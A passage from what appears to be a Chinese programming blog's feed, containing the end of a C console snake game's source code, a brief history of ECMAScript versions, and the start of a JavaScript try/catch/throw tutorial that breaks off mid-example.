keyword">case</span> <span class="token char">'2'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'w'</span><span class="token operator">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token char">'4'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'6'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'a'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'d'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'2'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'w'</span><span class="token punctuation">)</span>input <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'8'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token char">'4'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'6'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'a'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'d'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'8'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'s'</span><span class="token punctuation">)</span>input <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'4'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'a'</span><span class="token operator">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token char">'2'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'8'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'w'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'s'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'4'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'a'</span><span class="token punctuation">)</span>input <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'6'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token char">'2'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'8'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'w'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'s'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'6'</span> <span class="token operator">||</span> a <span class="token operator">==</span> <span class="token char">'d'</span><span class="token punctuation">)</span>input <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token comment">/* judge the direction by value of input */</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">'2'</span><span class="token operator">:</span><span class="token comment">/* up */</span><span class="token keyword">case</span> <span class="token char">'w'</span><span class="token operator">:</span>sy<span class="token operator">--</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'8'</span><span class="token operator">:</span><span class="token comment">/* down */</span><span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span>sy<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'4'</span><span class="token operator">:</span><span class="token comment">/* left */</span><span class="token keyword">case</span> <span class="token char">'a'</span><span class="token operator">:</span>sx<span class="token operator">--</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'6'</span><span class="token operator">:</span><span class="token comment">/* right */</span><span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span>sx<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>           <span class="token comment">/*  every point's address of body move back one point */</span><span class="token punctuation">&#123;</span>body<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> body<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span>body<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>                 <span class="token comment">/* change value by pointer */</span><span class="token punctuation">&#125;</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>mapArr<span class="token punctuation">[</span>sx<span class="token punctuation">]</span><span class="token punctuation">[</span>sy<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">*</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">/* judge when the snake hit the wall or eat itself */</span><span class="token punctuation">&#123;</span>overFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>              <span class="token comment">/* assign the head of snake by pointer */</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">EatFood</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>l<span class="token operator">++</span><span class="token punctuation">;</span>foodFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">StartGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>sx <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>sy <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>input <span class="token operator">=</span> <span class="token char">'6'</span><span class="token punctuation">;</span><span class="token keyword">int</span> j<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> l<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>             <span class="token comment">/* assign the snake body initial address value*/</span><span class="token punctuation">&#123;</span>body<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>mapArr<span class="token punctuation">[</span>sx <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">[</span>sy<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>overFlag<span class="token punctuation">)</span>    <span class="token comment">/* loop until the game over */</span><span class="token punctuation">&#123;</span><span class="token function">InitMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">SetSnakeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">SetRandNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">EatFood</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PrintMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">StartMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token operator">/</span>speed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">SetMoveNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">/* x move 1 -- (X - 2 ); y move 1 -- (Y - 2) */</span><span class="token comment">/* move x from left to right */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>moveY <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">+</span> moveFlag<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>moveX <span class="token operator">&lt;</span> inputX <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> moveFlag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mapArr<span class="token punctuation">[</span>moveX<span class="token punctuation">]</span><span class="token punctuation">[</span>moveY<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>moveX<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* move y from top to buttom */</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>moveX <span class="token operator">==</span> inputX <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> moveFlag<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>moveY <span class="token operator">&lt;</span> inputY <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> moveFlag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mapArr<span class="token punctuation">[</span>moveX<span class="token punctuation">]</span><span class="token punctuation">[</span>moveY<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>moveY<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* move x from right to left */</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>moveY <span class="token operator">==</span> inputY <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> moveFlag<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>moveX <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">+</span> moveFlag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mapArr<span class="token punctuation">[</span>moveX<span class="token punctuation">]</span><span class="token punctuation">[</span>moveY<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>moveX<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* move y from buttom to top */</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>moveX <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">+</span> moveFlag<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>moveY <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">+</span> moveFlag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mapArr<span class="token punctuation">[</span>moveX<span class="token punctuation">]</span><span class="token punctuation">[</span>moveY<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>moveY<span class="token operator">--</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>moveY <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">+</span> moveFlag<span class="token punctuation">)</span>     <span class="token comment">/* judge when to jump to a deeper layer */</span><span class="token punctuation">&#123;</span>moveFlag<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">JudgeEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> inputY<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> inputX<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>mapArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>moveX <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> moveY <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">InitMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>moveFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>out<span class="token operator">:</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">StartView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>moveX <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> moveY <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> moveFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> startFlag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">InitMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>startFlag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">SetMoveNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PrintMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"按任意键开始游戏：\n(Press any key to start game: )\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">JudgeEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'2'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'w'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'8'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'s'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'4'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'a'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'6'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token char">'d'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>startFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment">/* main function */</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是否修改设置（修改输入“y”,否则按任意键）：\nEdit the game setting or not ? (Press 'y' to edit, or press another key to go on:)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'y'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">GetSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span><span class="token function">StartView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* an animation before game start */</span><span class="token function">StartGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Game Over !!!\n游戏结束，按任意键继续：\n(Press any key to restart: )\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>overFlag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">/* restart the game by the flag */</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有更简单的算法欢迎评论指正！</p><h1 id="返回顶部"><a href="#返回顶部" class="headerlink" title="返回顶部"></a>返回<a href="#home">顶部</a></h1>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪吃蛇源码 C语言贪吃蛇 gluttonous-snake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECMAScript 发展简史</title>
      <link href="/2024/09/27/javascript/ecmascript-fa-zhan-jian-shi/"/>
      <url>/2024/09/27/javascript/ecmascript-fa-zhan-jian-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ECMAScript，简称 ES，是 JavaScript 的标准版，经历了不同版本的变化；</p></blockquote><ul><li><p>最初由于网速慢，网页验证表单需要通过服务器完成，因此Netscape（网景）公司决定开发这样一种用于处理验证的客户端语言；</p></li><li><p>1995年，发布 LiveScript，由于当时 Java 很火，就顺便改名为 JavaScript 蹭热度，与 Netscape Navigator 2 一同发布，成为 JavaScript 1.0;</p></li><li><p>1996年，JavaScript 1.1 与 Netscape Navigator 3 发布，同时微软也在 IE3 中加入 JScript（避免命名授权问题）；</p></li><li><p>1997年，ECMAScript 成为 JavaScript 的标准版本，标准命名为 ECMA-262，第一版为 ES1.0；</p></li><li><p>1998年，ES2.0 发布；</p></li><li><p>1999年，ES3.0 发布，标志其成为一门真正编程语言，成为JavaScript语法基础，即我们所学的 JavaScript；</p></li><li><p>2000年，ES4.0 发布，新标准几乎是区别于ES3的新语言，所以由于激进未通过，激烈争论了几年。。。</p></li><li><p>2008年，ES3.1 发布，作为 ES4.0 的替代方案，中止了 ES4.0的发布；</p></li><li><p>2009年，ES3.1 作为第五版（ES5.0）正式发布；</p></li><li><p>2011年，ES5.1 发布，成为国际标准；</p></li><li><p>2015年，ES6 正式成为国际标准，又称 ES2015，也是指 ES5.1 后的下一代JavaScript标准；</p></li></ul><p><strong>总结：JavaScript = ECMAScript(核心) + DOM + BOM;</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> es6 ECMAScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 中 try, catch, throw 的用法</title>
      <link href="/2024/09/27/javascript/javascript-zhong-try-catch-throw-de-yong-fa/"/>
      <url>/2024/09/27/javascript/javascript-zhong-try-catch-throw-de-yong-fa/</url>
      
        <content type="html"><![CDATA[<p>程序在运行中难免遇到 bug，所以就需要好的调试手段找出问题所在，<code>try, catch, throw</code> 便是 JavaScript 中用来调试并对错误执行相关操作的工具，下面具体介绍其用法；</p><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try, catch"></a>try, catch</h1><p>基本语法结构：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span>    <span class="token comment">// 这里写需要调试的代码段</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span>    <span class="token comment">// 这里写要对获取的错误信息执行的操作</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这里故意写错函数名，为了抛出错误</span>    console<span class="token punctuation">.</span><span class="token function">logg</span><span class="token punctuation">(</span><span class="token string">'This is an error and will not display'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// TypeError: console.logg is not a function</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// console.logg is not a function</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// TypeError</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// TypeError: console.logg is not a function</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的错误代码如果直接在正常环境中执行，便会直接在后台输出错误：</p><pre class="line-numbers language-none"><code class="language-none">TypeError: console.loggg is not a function<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是使用 <code>try, catch</code> 结构的话，就可以获取一个包含错误信息的对象，其包含各个部分的错误信息，便于进行一些自定义操作；</p><h1 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h1><p><code>throw</code> 是在上述结构中使用的一个函数，接受一个参数作为输出信息，throw 的作用是中断后面<strong>所有</strong>语句的执行，包括错误源，但是它前面的语句都会正常执行，它可以用于判断错误的具体位置，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This will display.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span><span class="token punctuation">(</span><span class="token string">'My error position.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// throw 将会中断语句的执行</span>    <span class="token comment">// 同样故意制造错误</span>    console<span class="token punctuation">.</span><span class="token function">logg</span><span class="token punctuation">(</span><span class="token string">'This is an error and will not display.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 后面是正常语句</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This will not display, either.'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// This will display.</span><span class="token comment">// My error position.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果错误发生在 <code>throw</code> 语句之前的话，错误便会被正常抛出，而 <code>throw</code> 传递的信息不会被输出，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">logg</span><span class="token punctuation">(</span><span class="token string">'This is an error and wil not display.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span><span class="token punctuation">(</span><span class="token string">'My error position.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 后面的执行同样会被中断</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This will not display, either.'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token 